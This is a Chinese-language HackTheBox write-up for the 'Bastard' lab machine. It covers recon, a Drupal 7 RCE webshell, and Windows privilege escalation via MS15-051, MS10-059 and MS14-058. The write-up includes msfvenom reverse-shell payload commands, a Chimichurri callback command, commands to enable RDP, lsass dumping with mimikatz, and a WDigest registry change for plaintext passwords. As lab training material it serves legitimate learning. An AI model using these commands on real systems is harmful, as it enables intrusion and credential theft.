---
title: "HackTheBox：Bastard 笔记"
slug: gm9u63
date: 2020-04-15T21:49:28+08:00
source: yuque/penetration
---

最近在**玩H**ack**T**he**B**ox上的靶机，觉得还是可以学到不少东西，下面就由

如果也有想玩靶机的师傅，可以去注册个帐号玩玩，它注册的时候也需要完成一个类似CTF的题，还蛮有意思的。

下面进入正题

**靶机地址**`10.10.10.9`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587124122471-8f43fcd0-7c5a-4be4-96a8-2f27ab2de635.png)

# 信息收集
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587118777861-a016a5fb-bf1c-4139-8946-a3e7fd7db479.png)

80跑的一个`drupal`，之前某靶场遇到过，用msf里rce的exp打一下，失败了

## NMAP
```sql
# nmap -sV -sC -Pn  -oA  scans/nmap-allports.tcp 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.49s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

> + **-sC**:使用nmap默认的脚本扫描
> + **-sV**: 确定操作系统版本
> + -**Pn**: 不ping直接扫
> + **-oA**:输出扫描结果到指定文件夹
>



拿到Drupal的大版本7之后，要确定小版本，看到NMAP扫出来一些静态文件，找到了版本是`7.54`

用`searchsploit drupal 7` 找，最终确定这几个

```sql
Drupal 7.x Module Services - Remote Code Execution  | exploits/php/webapps/41564.php
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)     | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)  | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Ex | exploits/php/webapps/44449.rb
```



用以下代码`searchsploit -m exploits/php/webapps/41564.php`拷贝exp到当前目录，更改一下路径为`/rest`![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587060858392-69fc71fa-0cdc-49ff-bcac-04371601d3e3.png)

这里`/rest`的路径，其实是需要用`dirb`或者`dirbuster`来爆的，不过我因为延迟很大就没有扫，直接从别人的wp知道的，运行exp，就可以得到webshell了。

# 提权


拿到webshell之后，用信息收集脚本`WinPEAS`([https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite))一通收集，加上自己一直在尝试，确定了几个可用的提权方式

## 提权：MS15-051
```python
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.16.122 LPORT=4444 > msf64.exe^C

use exploit/multi/handler  \
set payload windows/x64/meterpreter/reverse_tcp \
set  lhost 
```

需要注意的是，x64 和x86的listener是不一样的

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587059785848-cd640ec9-f850-4b00-93b6-e6eed764887d.png)

默认是x86的shell，**失败**

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587061602899-47a23321-ad14-4b91-b4de-ccb57369fbc0.png)



而在x64的shell内提权，**成功**

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587061518084-62ef4fae-c7b9-4f5b-a55c-ecaed24e1b0f.png)

## 提权：MS10-059
这个在msf里并没有对应的利用模块，不过在github上找到了[https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe](https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe)，是可用的提权exe

```python
Chimichurri.exe 10.10.16.122 4443
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587118423587-e1b3a276-30f4-45a4-8b6a-a7e51a11afd4.png)

[https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

## 提权：MS14-058
> 2014-10-30 消息
>
> 由CrowStrike发现，使用了半年多的Windows本地提权漏洞MS14-058(CVE-2014-4113)工具已经公开。
>
> 其提权成功率达到100%:
>



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587102168225-8112a6b1-a418-4df5-8ed6-678a5306ca7e.png)



后来接上了cs常识提权。不过不知什么缘故，只有80端口可以建立cs的会话，443、4444或8888端口均无法反弹

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587101700488-b0ad6e39-c734-4ae6-bac9-94aca645fb63.png)

直接上`ms14-058`，可以看到成功提权为`system`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587104941645-1ee0b0d0-6e6f-4dd1-98be-e430100c3bae.png)

# 之后的玩法
用`webshell`找到帐号密码，进数据库玩玩，admin的密码是

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587102459105-4ec2f0ce-81dd-4de2-ba27-080feae280de.png)

cmd5无法解密，但是可以参考[drupal-reset-password](https://www.isfirst.net/drupal/drupal-reset-password)，将其更改为已知密码123456的密文，登录后台看有无上传shell的点（后面发现，后台其实也有能拿shell的地方，但是对这个靶机没有意义了，毕竟不是sql注入进来的）



## 开3389进远程桌面
`meterpreter`里开`rdp`远程桌面



`run getgui -h`可以看添加用户的格式，注意密码的强度要到位

```markdown
# Win7、Win2003、XP系统
## 在CMD命令行开启3389端口：
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

## 在CMD命令行关闭3389端口（将00000000改成11111111即可）：
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587066521634-e4f0b478-3cb5-4cd9-94cc-090ae6a6b8c7.png)

直接进rdp了



## 抓hash
一般而言，我在windows下抓`hash`会用2种方法：

第一种，在`meterpreter`的会话里直接`**hashdump**`，或者开coablt strike直接`run mimikatz`

```python
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3c87620c26302e9f04a756e3301e63a:::
dimitris:1004:aad3b435b51404eeaad3b435b51404ee:57544bb8930967eee7f44d46f8bfe59d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```



我个人偏向于第二种**:转储**`**lsass.exe**`**文件**，拖回本地用`mimikatz`来读`hash`。这种方法的好处是不用对`mimikatz`进行免杀，因为实战环境的内网里一般都有`EDR`，遇到个人主机运行mimikatz这种行为，肯定是会报异常的，搞不好权限就要丢失，这时候就适宜用拖这种转储文件回本地的办法来抓hash。

**prodump.exe工具**

该工具是微软出品的工具，具有一定免杀效果。可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码。

```python
# 转储lsass
procdump.exe -accepteula -ma lsass.exe lsass_dump

#lsass_dump.dmp为保存dump数据的文件
mimikatz.exe "sekurlsa::minidump lsass_dump.dmp" "sekurlsa::logonPasswords full" exit
```

另外，当系统为win10或2012R2以上时，**默认在****内存缓存中禁止保存明文密码**，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

# 总结与反思
+ 其实搞这个靶机，最困难的步骤还是 找到 `drupal 7`的那个RCE，网上很多人使用这两款工具来对`drupal`进行有针对的扫描，[https://github.com/topics/drupalgeddon2](https://github.com/topics/drupalgeddon2)和[https://github.com/droope/droopescan](https://github.com/droope/droopescan)，也可以确定到这个漏洞，有兴趣的朋友不妨试试
+ `Drupal 7`的配置文件（数据库密码）路径为`/sites/default/settings.php`
+ `Drupal`的具体版本可在`/CHANGELOG.txt`中确定，其它CMS类似思路，多找找readme之类的文件
+ 如果想改Drupal的管理员密码，找到表users，找到里面的用户名对应的密码框。可以直接复制其他用户的密码到忘记密码的账户上面。还可以直接复制（这段加密代码明文是：123456，稍后用这个密码登录即可）：

`$S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4`

+ Windows 补丁一览表

```python
漏洞列表
 
#Security Bulletin   #KB     #Description    #Operating System
 
CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)
MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)
MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)
MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)
MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)
MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)
MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)
MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)
MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)
MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)
MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)
MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)
MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)
MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)
MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)
MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)
MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)
MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)
MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)
MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)
MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)
MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)
MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)
MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)
MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)
MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)
MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)
MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7)
MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)
MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)
MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)
MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)
MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)
MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)
MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)
MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)
MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)
MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)

```

# reference
+ [分享一个转储lsass.exe进程的工具 - CE653A - 博客园](https://www.cnblogs.com/dgjnszf/p/11246612.html)
+ [https://0xdf.gitlab.io/2019/03/12/htb-bastard.html](https://0xdf.gitlab.io/2019/03/12/htb-bastard.html)
+ [https://prakash-khadka.com.np/hackthebox-bastard-windows/](https://prakash-khadka.com.np/hackthebox-bastard-windows/)
+ [https://github.com/Re4son/Chimichurri](https://github.com/Re4son/Chimichurri)
+ [https://www.isfirst.net/drupal/drupal-reset-password](https://www.isfirst.net/drupal/drupal-reset-password)
+ [windows hash 抓取总结 - FreeBuf专栏·TideSec](https://www.freebuf.com/column/228496.html)



